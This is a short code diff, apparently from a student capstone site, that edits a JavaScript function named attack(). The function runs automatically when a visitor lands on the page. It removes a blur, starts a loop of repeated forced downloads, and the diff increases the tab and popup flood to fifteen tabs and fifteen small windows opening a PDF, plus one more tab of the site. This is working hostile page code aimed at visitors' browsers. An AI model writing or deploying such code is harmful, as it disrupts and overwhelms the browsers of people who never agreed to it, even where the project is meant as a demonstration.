@@ -115,6 +115,7 @@
   function attack() {                                                               // No click, on landing attack
     document.getElementById('blurred').style.filter = 'none';                       // Remove Blur
 
+
     // Start repeated downloads
     // Create anchor element
     // Creates download loop function
@@ -134,14 +135,19 @@
       document.body.removeChild(link);
     }
 
-    // Multiple Tabs
-    for (let i = 0; i < 5; i++) {
+    // Multiple Tabs Null
+    for (let i = 0; i < 15; i++) {
+      window.open('https://arizona5005.github.io/Capstone/menu.pdf', '_blank');
+    }
+
+    // Multiple Tabs Attack
+    for (let i = 0; i < 1; i++) {
       window.open('https://arizona5005.github.io/Capstone/', '_blank');
     }
 
-    // Multiple Windows
-    for (let i = 0; i < 5; i++) {
-      window.open('https://arizona5005.github.io/Capstone/', '_blank', 'noopener,noreferrer,width=400,height=400');
+    // Multiple Windows Null
+    for (let i = 0; i < 15; i++) {
+      window.open('https://arizona5005.github.io/Capstone/menu.pdf', '_blank', 'noopener,noreferrer,width=400,height=400');
     }
 
 
